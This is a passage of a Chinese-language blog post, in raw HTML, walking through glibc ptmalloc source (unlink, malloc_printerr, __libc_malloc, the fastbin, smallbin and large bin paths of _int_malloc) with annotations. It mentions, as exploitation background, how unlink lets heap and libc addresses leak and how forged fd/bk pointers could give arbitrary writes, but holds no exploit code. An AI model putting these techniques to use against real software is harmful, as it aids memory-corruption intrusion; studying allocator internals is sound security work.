</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class="line">              &#125;                                                                      </span><br><span class="line">          &#125;                                                                      </span><br><span class="line">      &#125;                                                                              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们以 small bin 的 unlink 为例子介绍一下。对于 large bin 的 unlink，与其类似，只是多了一个 nextsize 的处理。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212591.png" alt="img"></p><p>可以看出， <strong>P 最后的 fd 和 bk 指针并没有发生变化</strong>，但是当我们去遍历整个双向链表时，已经遍历不到对应的链表了。这一点没有变化还是很有用处的，因为我们有时候可以使用这个方法来泄漏地址</p><ul><li><strong>libc 地址</strong><ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li><strong>泄漏堆地址</strong>，双向链表包含多个空闲 chunk<ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li></ul><p><strong>注意</strong></p><ul><li>这里的<strong>头部</strong>指的是 bin 的 fd 指向的 chunk，即双向链表中<strong>最新加入的 chunk</strong>。</li><li>这里的<strong>尾部</strong>指的是 bin 的 bk 指向的 chunk，即双向链表中<strong>最先加入的 chunk</strong>。</li></ul><p>同时，无论是对于 fd，bk 还是 fd_nextsize ，bk_nextsize，程序都会检测 fd 和 bk 是否满足对应的要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// next_size related</span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>看起来似乎很正常。我们以 fd 和 bk 为例，P 的 forward chunk 的 bk 很自然是 P ，同样 P 的 backward chunk 的 fd 也很自然是 P 。如果没有做相应的检查的话，我们可以修改 P 的 fd 与 bk，从而可以很容易地达到任意地址写的效果。关于更加详细的例子，可以参见利用部分的 unlink 。</p><p><strong>注意：堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。</strong></p><h5 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h5><p>在 glibc malloc 时检测到错误的时候，会调用 <code>malloc_printerr</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_printerr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">  __libc_message(do_abort, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  __builtin_unreachable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要会<strong>调用 <code>__libc_message</code> 来执行<code>abort</code> 函数</strong>，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((action &amp; do_abort)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; do_backtrace))</span><br><span class="line">    BEFORE_ABORT(do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Kill the application.  */</span></span><br><span class="line">  <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在<code>abort</code> 函数里，在 glibc 还是 2.23 版本时，会 fflush stream</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">   might have registered a handler for SIGABRT.  */</span></span><br><span class="line"><span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h5 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h5><p>堆初始化是在<strong>用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的</strong>。这里不做过多讲解。可以参见 <code>malloc_state</code> 相关函数。</p><h4 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h4><h5 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h5><p>一般我们会使用 malloc 函数来申请内存块，可是当仔细看 glibc 的源码实现时，其实并没有 malloc 函数。其实该函数真正调用的是 __libc_malloc 函数。为什么不直接写个 malloc 函数呢，因为有时候我们可能需要不同的名称。此外，__libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。下面我们来仔细分析一下具体的实现。</p><p>该函数会<strong>首先检查是否有内存分配函数的钩子函数（__malloc_hook）</strong>，这个主要用于用户自定义的堆分配函数，方便用户快速修改堆分配函数并进行测试。这里需要注意的是，<strong>用户申请的字节一旦进入申请内存函数中就变成了无符号整数</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;     <span class="comment">//表示堆管理器的状态</span></span><br><span class="line">    <span class="type">void</span> * victim;    <span class="comment">//表示分配的内存块的指针</span></span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="type">void</span> *(*hook)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));   </span><br><span class="line">    <span class="comment">//钩子函数接受两个参数：分配的字节数和返回地址。这里使用RETURN_ADDRESS(0)获取当前函数的返回地址作为参数传递给钩子函数</span></span><br><span class="line">    <span class="comment">//如果不存在内存分配钩子，则继续执行后续的内存分配操作</span></span><br></pre></td></tr></table></figure><p>接着会寻找一个 arena 来试图分配内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>然后调用 _int_malloc 函数去申请对应的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);  <span class="comment">//用于在给定的堆管理器中查找另一个可用的堆管理器的函数</span></span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果申请到了 arena，那么在退出之前还得<strong>解锁</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>) __libc_lock_unlock(ar_ptr-&gt;mutex);</span><br></pre></td></tr></table></figure><p>判断目前的状态是否满足以下条件</p><ul><li>要么没有申请到内存</li><li>要么是 mmap 的内存</li><li><strong>要么申请到的内存必须在其所分配的 arena 中</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||ar_ptr == arena_for_chunk(mem2chunk(victim)));  <span class="comment">//断言语句，假则中断程序，确保在特定情况下，victim指针的状态与堆管理器的状态相符合</span></span><br></pre></td></tr></table></figure><p>最后返回内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h5><p>_int_malloc 是内存分配的核心函数，其核心思路有如下</p><ol><li>它根据用户申请的<strong>内存块大小</strong>以及<strong>相应大小 chunk 通常使用的频度</strong>（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li><li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li><li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li><li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">在进入该函数后，函数立马定义了一系列自己需要的变量，并将用户申请的内存大小转换为内部的 chunk 大小。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *_int_malloc(mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  <span class="comment">/* normalized request size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    idx; <span class="comment">/* associated bin index */</span></span><br><span class="line">    mbinptr         bin; <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr       victim;       <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T size;         <span class="comment">/* its size */</span></span><br><span class="line">    <span class="type">int</span>             victim_index; <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr     remainder;      <span class="comment">/* remainder from a split */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> block; <span class="comment">/* bit map traverser */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bit;   <span class="comment">/* bit map traverser */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;   <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr fwd; <span class="comment">/* misc temp for linking */</span></span><br><span class="line">    mchunkptr bck; <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">       overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">       to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">       size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">       that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">       aligned.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    checked_request2size(bytes, nb);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *_int_malloc(mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  <span class="comment">/* 规范化后的请求大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx;   <span class="comment">/* 相关联的bin索引 */</span></span><br><span class="line">    mbinptr bin;        <span class="comment">/* 相关联的bin */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr victim;       <span class="comment">/* 被检查/选择的chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T size;   <span class="comment">/* chunk的大小 */</span></span><br><span class="line">    <span class="type">int</span> victim_index;       <span class="comment">/* chunk的bin索引 */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr remainder;      <span class="comment">/* 分割后的剩余部分 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* 剩余部分的大小 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> block; <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bit;   <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;   <span class="comment">/* 当前binmap的字 */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr fwd; <span class="comment">/* 用于链接的临时变量 */</span></span><br><span class="line">    mchunkptr bck; <span class="comment">/* 用于链接的临时变量 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       通过添加SIZE_SZ字节的开销，将请求大小转换为内部形式，</span></span><br><span class="line"><span class="comment">       可能还需要更多的字节以获得必要的对齐和/或至少为MINSIZE的大小，</span></span><br><span class="line"><span class="comment">       MINSIZE是最小可分配大小。此外，checked_request2size函数</span></span><br><span class="line"><span class="comment">       会检查并阻止（返回0）请求大小太大，以至于在填充和对齐时</span></span><br><span class="line"><span class="comment">       四舍五入为零。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    checked_request2size(bytes, nb);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 其他代码...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="arena-1"><a href="#arena-1" class="headerlink" title="arena"></a>arena</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(av == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h5><p>如果申请的 chunk 的大小位于 fastbin 范围内，<strong>需要注意的是这里比较的是无符号整数</strong>。<strong>此外，是从 fastbin 的头结点开始取 chunk</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">       This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">       can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果大小符合快速分配块的条件，首先检查相应的bin。</span></span><br><span class="line"><span class="comment">   即使av(内存管理状态结构体)尚未初始化，这段代码也可以安全执行，因此我们可以在不检查的情况下尝试执行它，</span></span><br><span class="line"><span class="comment">   这在这个快速路径上节省了一些时间。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())) &#123;</span><br><span class="line">        <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">        idx             = fastbin_index(nb);</span><br><span class="line">        <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">        mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">        mchunkptr    pp = *fb;</span><br><span class="line">        <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            victim = pp;</span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,victim)) != victim);</span><br><span class="line">        <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">        <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">            <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">            <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">                malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">            <span class="type">void</span> *p = chunk2mem(victim); <span class="comment">//将内存块的起始地址转换为指向实际可用内存的指针</span></span><br><span class="line">            <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes); <span class="comment">//对内存块进行初始化</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h5><p>如果获取的内存块的范围处于 small bin 的范围，那么执行如下流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot; hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果是小的内存请求，检查常规的空闲块链表。由于这些&quot;smallbins&quot;只包含一种大小的内存块，所以不需要在链表中进行搜索。</span></span><br><span class="line"><span class="comment">   （对于大的内存请求，我们需要等待未排序的内存块被处理以找到最佳匹配。但对于小的请求，匹配是精确的，所以我们可以立即检查，这样更快。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">        <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。//自循环</span></span><br><span class="line">        <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// 细致的检查，非调试状态没有作用</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">                <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h5><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。<strong>为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">       While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">       even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">       fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">       Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">       large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">       invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">       it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果这是一个大的内存请求，在继续之前先合并 fastbins。</span></span><br><span class="line"><span class="comment">   尽管在查看是否有可用空间之前杀死所有 fastbins 看起来可能有些过度，</span></span><br><span class="line"><span class="comment">   但这样可以避免通常与 fastbins 相关的碎片化问题。</span></span><br><span class="line"><span class="comment">   